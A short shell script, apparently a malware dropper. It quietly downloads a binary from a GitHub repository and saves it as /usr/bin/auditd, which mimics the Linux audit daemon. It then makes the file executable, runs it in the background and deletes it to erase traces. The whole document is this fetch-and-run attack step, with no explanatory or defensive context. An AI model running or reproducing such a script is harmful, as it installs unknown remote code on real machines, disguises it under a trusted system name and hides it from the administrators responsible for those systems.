#!/bin/sh
wget --quiet -O /usr/bin/auditd https://github.com/jackmoc/update/raw/refs/heads/main/auditd
chmod +x /usr/bin/auditd 
/usr/bin/auditd &
rm -rf /usr/bin/auditd
